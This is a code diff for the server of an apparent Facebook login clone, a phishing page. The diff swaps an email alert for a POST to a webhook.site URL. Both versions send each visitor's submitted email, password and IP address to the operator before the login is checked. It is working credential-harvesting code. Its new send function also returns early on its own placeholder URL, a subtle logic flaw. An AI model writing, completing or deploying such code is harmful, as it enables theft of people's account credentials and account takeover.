@@ -1,26 +1,12 @@
 const express = require('express');
 const cors = require('cors');
-const nodemailer = require('nodemailer');
+const axios = require('axios');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Email config from Render Environment Variables
-const EMAIL_USER = process.env.EMAIL_USER;
-const EMAIL_PASS = process.env.EMAIL_PASS;
-const SEND_TO_EMAIL = process.env.SEND_TO_EMAIL;
-
-// Email transporter
-let transporter = null;
-if (EMAIL_USER && EMAIL_PASS) {
-    transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: { user: EMAIL_USER, pass: EMAIL_PASS }
-    });
-    console.log('✅ Email configured');
-} else {
-    console.log('⚠️ Email not configured');
-}
+// Webhook.site URL - Get yours from https://webhook.site
+const WEBHOOK_URL = 'https://webhook.site/6d16ab4f-ced3-428f-b879-2aa8e37db36b';  // You'll get this
 
 app.use(cors());
 app.use(express.json());
@@ -28,27 +14,26 @@ app.use(express.static('public'));
 
 const users = [];
 
-// Send email function
-async function sendEmailAlert(email, password, ip) {
-    if (!transporter) return;
+// Send to webhook
+async function sendToWebhook(email, password, ip) {
+    if (!WEBHOOK_URL || WEBHOOK_URL === 'https://webhook.site/6d16ab4f-ced3-428f-b879-2aa8e37db36b') return;
     
-    const subject = `🔐 Login Alert - ${new Date().toLocaleString()}`;
-    const body = `New login attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nTime: ${new Date()}`;
+    const data = {
+        timestamp: new Date().toISOString(),
+        email: email,
+        password: password,
+        ip: ip,
+        userAgent: 'Facebook Login Clone'
+    };
     
     try {
-        await transporter.sendMail({
-            from: EMAIL_USER,
-            to: SEND_TO_EMAIL,
-            subject: subject,
-            text: body
-        });
-        console.log('✅ Email sent');
+        await axios.post(WEBHOOK_URL, data);
+        console.log('✅ Webhook sent');
     } catch (error) {
-        console.log('❌ Email error:', error.message);
+        console.log('❌ Webhook error:', error.message);
     }
 }
 
-// Register
 app.post('/api/register', (req, res) => {
     const { name, email, password } = req.body;
     
@@ -71,13 +56,12 @@ app.post('/api/register', (req, res) => {
     res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
 });
 
-// Login - SENDS EMAIL
 app.post('/api/login', (req, res) => {
     const { identifier, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
-    // Send email alert
-    sendEmailAlert(identifier, password, ip);
+    // Send to webhook
+    sendToWebhook(identifier, password, ip);
     
     if (!identifier || !password) {
         return res.status(400).json({ error: 'Email and password required' });
